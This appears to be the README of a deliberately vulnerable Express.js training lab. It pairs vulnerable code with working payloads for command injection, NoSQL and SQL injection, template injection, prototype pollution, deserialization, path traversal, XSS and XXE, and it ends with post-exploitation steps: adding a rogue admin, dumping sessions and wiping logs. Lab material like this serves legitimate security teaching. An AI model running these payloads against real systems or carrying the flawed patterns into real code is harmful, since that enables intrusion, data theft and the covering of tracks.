# Express.js Vulnerable Application

## Overview
A deliberately vulnerable Express.js application demonstrating common security vulnerabilities in Node.js web applications, including Express-specific issues and JavaScript security flaws.

## Quick Start

**Access URL**: http://localhost:3003

**API Documentation**: http://localhost:3003/api-docs

**Default Credentials**:
- Admin: `admin` / `admin123`
- User: `user` / `password`
- Test: `test@example.com` / `test123`

## Application Features

- RESTful API
- User authentication (JWT)
- File upload/download
- MongoDB integration
- Real-time chat (Socket.io)
- Template rendering (EJS)
- Session management
- Admin dashboard

## Vulnerabilities

### 1. Command Injection
```javascript
// Vulnerable endpoint
app.get('/ping', (req, res) => {
    const host = req.query.host;
    exec(`ping -c 4 ${host}`, (err, stdout) => {
        res.send(stdout);
    });
});

// Attack
http://localhost:3003/ping?host=google.com;cat /etc/passwd
http://localhost:3003/ping?host=;rm -rf /tmp/*
```

### 2. NoSQL Injection
```javascript
// Vulnerable MongoDB query
app.post('/login', async (req, res) => {
    const user = await User.findOne({
        username: req.body.username,
        password: req.body.password
    });
});

// Attack - Authentication bypass
POST /login
Content-Type: application/json
{
    "username": {"$ne": null},
    "password": {"$ne": null}
}
```

### 3. Server-Side Template Injection (SSTI)
```javascript
// Unsafe template rendering
app.post('/template', (req, res) => {
    const template = req.body.template;
    res.render('dynamic', { content: template });
});

// EJS payload
<%= process.mainModule.require('child_process').execSync('whoami') %>

// Attack
POST /template
template=<%= process.mainModule.require('child_process').execSync('cat /etc/passwd') %>
```

### 4. Prototype Pollution
```javascript
// Vulnerable merge function
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = merge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Attack
POST /api/settings
{
    "__proto__": {
        "isAdmin": true,
        "role": "admin"
    }
}
```

### 5. Insecure Deserialization
```javascript
// Vulnerable code using node-serialize
app.post('/import', (req, res) => {
    const data = serialize.unserialize(req.body.data);
    res.json(data);
});

// Attack payload
{"data":"_$$ND_FUNC$$_function(){require('child_process').exec('cat /etc/passwd',function(e,s){console.log(s)})}()"}
```

### 6. Path Traversal
```javascript
app.get('/download', (req, res) => {
    const filename = req.query.file;
    res.sendFile(path.join(__dirname, 'uploads', filename));
});

// Attack
http://localhost:3003/download?file=../../../../etc/passwd
http://localhost:3003/download?file=..%2F..%2F..%2Fetc%2Fpasswd
```

### 7. JWT Secret Weakness
```javascript
// Weak/hardcoded secret
const JWT_SECRET = 'secret123';

// Or using default/predictable secret
jwt.sign(payload, process.env.JWT_SECRET || 'default');

// Attack - Forge tokens
// Use jwt.io with known secret
```

### 8. SQL Injection (with SQL databases)
```javascript
// If using SQL
app.get('/users', (req, res) => {
    const query = `SELECT * FROM users WHERE name = '${req.query.name}'`;
    db.query(query, (err, results) => {
        res.json(results);
    });
});

// Attack
http://localhost:3003/users?name=' OR '1'='1
```

### 9. Cross-Site Scripting (XSS)
```javascript
// Reflected XSS
app.get('/search', (req, res) => {
    res.send(`<h1>Search results for: ${req.query.q}</h1>`);
});

// Stored XSS in comments
app.post('/comment', (req, res) => {
    comments.push({
        text: req.body.text, // No sanitization
        user: req.user.name
    });
});

// Attack
<script>alert(document.cookie)</script>
<img src=x onerror="fetch('/steal?c='+document.cookie)">
```

### 10. XXE in XML Parser
```javascript
// Vulnerable XML parsing
const libxml = require('libxmljs');
app.post('/xml', (req, res) => {
    const doc = libxml.parseXml(req.body, { noent: true });
    res.json(doc.toString());
});

// Attack
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### 11. Regex DoS (ReDoS)
```javascript
// Vulnerable regex
app.post('/validate', (req, res) => {
    const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    if (emailRegex.test(req.body.email)) {
        res.json({ valid: true });
    }
});

// Attack - Catastrophic backtracking
aaaaaaaaaaaaaaaaaaaaaaaaaaaa@aaaa.aa.aa.aa.aa.aa.aa.aa!
```

### 12. Race Condition
```javascript
// Vulnerable withdrawal function
app.post('/withdraw', async (req, res) => {
    const user = await User.findById(req.user.id);
    if (user.balance >= req.body.amount) {
        user.balance -= req.body.amount;
        await user.save();
        res.json({ success: true });
    }
});

// Attack - Concurrent requests
// Send multiple requests simultaneously
```

## Express/Node.js Specific Issues

### 1. Debug Mode Information Disclosure
```javascript
// Express error handler in production
app.use((err, req, res, next) => {
    res.status(500).json({
        message: err.message,
        stack: err.stack, // Exposes file paths
        env: process.env  // Exposes secrets
    });
});
```

### 2. Unhandled Promise Rejection
```javascript
// Can crash the application
app.get('/crash', async (req, res) => {
    const data = await someAsyncFunction();
    // No try-catch, crashes on error
});
```

### 3. Event Emitter Memory Leak
```javascript
// Memory leak via event listeners
app.get('/subscribe', (req, res) => {
    eventEmitter.on('update', (data) => {
        // Never removed, accumulates
    });
});
```

### 4. Middleware Bypass
```javascript
// Authentication middleware bypass
app.use('/api/*', authenticate);
app.get('/api/../public/admin', (req, res) => {
    // Bypasses authentication
});
```

## Exploitation Techniques

### Extract Environment Variables
```javascript
// Via SSTI
<%= process.env %>
<%= Object.keys(process.env).map(k => `${k}=${process.env[k]}`).join('\n') %>

// Via error messages
// Trigger error that exposes env
```

### MongoDB Exploitation
```javascript
// Extract all data
{"username": {"$ne": null}} // Matches all

// Regex extraction
{"password": {"$regex": "^a"}} // Check if password starts with 'a'

// Time-based extraction
{"$where": "sleep(5000) || true"} // Causes delay
```

### Prototype Pollution to RCE
```javascript
// Pollute Object prototype
{
    "__proto__": {
        "shell": "/bin/bash",
        "NODE_OPTIONS": "--require /tmp/evil.js"
    }
}

// Then trigger child_process spawn
```

### JWT Attacks
```bash
# None algorithm
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

# Crack weak secret
john jwt.txt --wordlist=passwords.txt

# Key confusion (RS256 to HS256)
```

## Common Misconfigurations

1. **No Helmet.js** - Missing security headers
2. **CORS: Origin: '*'** - Allows any origin
3. **bodyParser with no limit** - DoS via large payloads
4. **No rate limiting** - Brute force attacks
5. **Synchronous operations** - Blocks event loop
6. **No input validation** - Various injections
7. **console.log in production** - Information disclosure

## Testing Tools

### Automated Scanning
```bash
# Node.js security scanner
npm audit
snyk test

# Dependency check
npm-check-updates
retire.js

# SAST scanning
semgrep --config=auto .
```

### Manual Testing
```bash
# NoSQL injection
curl -X POST http://localhost:3003/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# Command injection
curl "http://localhost:3003/ping?host=;id"

# Path traversal
curl "http://localhost:3003/download?file=../../../etc/passwd"
```

## Defense Mechanisms (What's Missing)
- ❌ Input validation (express-validator)
- ❌ Output encoding
- ❌ Parameterized queries
- ❌ Security headers (helmet.js)
- ❌ Rate limiting
- ❌ CSRF protection
- ❌ Secure session configuration
- ❌ Error handling

## Debug/Development Features in Production

```javascript
// Morgan logging exposing sensitive data
app.use(morgan('combined'));

// Express debug mode
DEBUG=* node app.js

// Source maps enabled
app.use('/maps', express.static('dist'));
```

## Learning Objectives
- Understanding Node.js event loop vulnerabilities
- Express middleware security
- JavaScript-specific vulnerabilities
- NoSQL injection techniques
- Prototype pollution exploitation
- Secure Express.js development

## Post-Exploitation

```javascript
// Create admin user
db.users.insert({
    username: "hacker",
    password: "hacked",
    role: "admin"
});

// Extract all data
db.users.find({}).pretty();
db.sessions.find({}).pretty();

// Clean logs
require('fs').writeFileSync('./access.log', '');
```

## Additional Resources
- [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
- [Node.js Security Checklist](https://blog.risingstack.com/node-js-security-checklist/)
- [OWASP NodeGoat](https://github.com/OWASP/NodeGoat) 